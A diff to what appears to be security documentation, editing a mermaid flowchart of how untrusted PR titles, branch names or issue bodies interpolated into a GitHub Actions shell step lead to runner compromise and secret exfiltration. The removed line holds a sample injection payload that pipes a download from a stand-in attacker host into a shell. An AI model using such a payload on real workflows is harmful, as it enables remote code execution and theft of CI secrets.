@@ -656,7 +656,8 @@ sequenceDiagram
 ```mermaid
 flowchart TD
     INPUT["Untrusted input<br/>PR title, branch name,<br/>issue body"] --> INTERP{"Interpolated<br/>into shell?"}
-    INTERP -->|Yes: github.event in run| INJECT["Injection:<br/>'; curl attacker |sh; #'"] INTERP -->|No: via env<br/>or safe context| SAFE["Safe:<br/>input treated as data"]
+    INTERP -->|Yes: github.event in run| INJECT["Injection:<br/>quote curl attacker sh quote"]
+    INTERP -->|No: via env<br/>or safe context| SAFE["Safe:<br/>input treated as data"]
 
     INJECT --> RCE["RCE on runner<br/>to secret exfil<br/>to artifact tamper"]
     style RCE fill:#f88,stroke:#900
